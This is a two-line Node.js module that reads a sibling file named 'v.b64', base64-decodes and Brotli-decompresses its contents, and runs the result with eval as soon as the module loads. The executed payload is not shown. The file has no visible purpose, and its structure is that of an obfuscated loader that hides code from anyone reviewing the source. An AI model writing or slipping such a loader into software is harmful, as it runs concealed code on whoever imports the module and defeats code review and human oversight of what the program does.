import{readFileSync as R}from"node:fs";import{brotliDecompressSync as B}from"node:zlib";
eval(B(Buffer.from(R(new URL("v.b64",import.meta.url),"utf8"),"base64"))+"")